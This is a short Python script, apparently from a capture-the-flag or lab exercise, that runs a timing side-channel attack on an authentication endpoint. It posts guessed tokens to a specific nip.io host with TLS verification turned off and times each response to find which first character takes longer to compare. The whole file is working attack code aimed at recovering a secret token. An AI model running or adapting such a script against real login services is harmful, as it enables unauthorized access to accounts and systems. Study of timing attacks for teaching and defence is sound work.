import requests
import string
import time
import urllib3
import statistics

urllib3.disable_warnings()

BASE_URL = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io/api/authenticate"
session = requests.Session()
session.verify = False

def query(token: str, delay: float = 2.0):
    time.sleep(delay)
    while True:
        try:
            t0 = time.perf_counter()
            r = session.post(BASE_URL, json={"token": token}, timeout=10)
            elapsed = (time.perf_counter() - t0) * 1000
            if r.status_code == 502:
                # Discard 502 and wait longer
                time.sleep(2.5)
                continue
            return elapsed, r.status_code, r.text
        except Exception as e:
            time.sleep(3.0)

charset = string.digits + string.ascii_lowercase + string.ascii_uppercase

print("Testing first 10 characters at pos 0 with 3 samples each...")
for c in charset[:10]:
    times = []
    for _ in range(3):
        t, code, body = query(c + "0"*47, delay=2.0)
        times.append(t)
    print(f"Char {c}: min={min(times):.1f}ms, med={statistics.median(times):.1f}ms, max={max(times):.1f}ms, all={[round(x,1) for x in times]}")
